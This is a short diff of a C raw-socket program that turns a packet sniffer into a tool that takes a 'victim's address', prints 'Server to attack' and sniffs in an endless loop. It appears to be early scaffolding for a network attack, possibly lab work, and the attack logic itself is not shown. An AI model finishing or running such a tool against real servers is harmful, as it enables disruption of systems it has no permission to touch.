@@ -227,16 +227,14 @@ void debug_packet(unsigned char *packet, int len) {
 }
 
 int main(int argc, char **argv) {
-	int raw;
+	int raw, len;
 	unsigned char packet_buffer[2048];
-	int len;
-	int packets_to_sniff;
 	struct sockaddr_ll packet_info;
+	char *server_victim;
 	int packet_info_size = sizeof(packet_info);
 
-
 	if (argc < 3) {
-		printf("Usage: %s <interface> <num of packets>\n", argv[0]);
+		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
 		exit(0);
 	}
 
@@ -253,10 +251,11 @@ int main(int argc, char **argv) {
 	bind_socket_to_device(argv[1], raw);
 
 	/* Get number of packets to sniff from user */
-	packets_to_sniff = atoi(argv[2]);
+	server_victim = argv[2];
+	printf("Server to attack: %s\n", server_victim);
 
 	/* Start Sniffing and print Hex of every packet */
-	while (packets_to_sniff--) {
+	while (1) {
 		if ((len = recvfrom(raw, packet_buffer, 2048, 0,
 							(struct sockaddr*)&packet_info,
 							(socklen_t *)&packet_info_size)) == -1) {
